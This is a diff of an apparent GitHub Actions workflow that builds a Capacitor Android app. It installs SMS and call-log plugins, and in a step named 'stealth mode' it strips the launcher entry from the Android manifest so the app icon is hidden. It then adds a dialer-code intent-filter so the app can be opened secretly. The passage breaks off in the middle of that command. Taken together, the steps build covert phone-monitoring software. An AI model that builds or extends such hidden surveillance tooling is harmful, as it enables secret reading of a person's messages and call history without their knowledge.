@@ -29,12 +29,14 @@ jobs:
       - name: Install Capacitor and plugins
         run: |
           npm install @capacitor/cli @capacitor/android @capacitor/core
-          npm install @capacitor-community/sms capacitor-call-log @capacitor/preferences @capacitor/network
+          npm install capacitor-sms capacitor-call-log @capacitor/preferences @capacitor/network
 
-      - name: Build web assets (already in www folder)
+      - name: Prepare webDir
         run: |
           mkdir -p www
-          cp www/index.html www/app.js ./ 2>/dev/null || true
+          # Ensure index.html and app.js exist in www
+          if [ -f www/index.html ]; then echo "www/index.html exists"; else echo "Missing index.html" && exit 1; fi
+          if [ -f www/app.js ]; then echo "www/app.js exists"; else echo "Missing app.js" && exit 1; fi
 
       - name: Capacitor init and sync
         run: |
@@ -42,10 +44,11 @@ jobs:
           npx cap add android
           npx cap sync
 
-      - name: Patch AndroidManifest for stealth mode (remove launcher)
+      - name: Patch AndroidManifest for stealth mode
         run: |
+          # Remove launcher category
           sed -i '/<category android:name="android.intent.category.LAUNCHER"\/>/d' android/app/src/main/AndroidManifest.xml
-          # Add dialer code intent-filter
+          # Add dialer code intent-filter before closing activity tag
           sed -i '/<\/activity>/i \
           <intent-filter>\n\
               <action android:name="android.intent.action.VIEW" />\n\
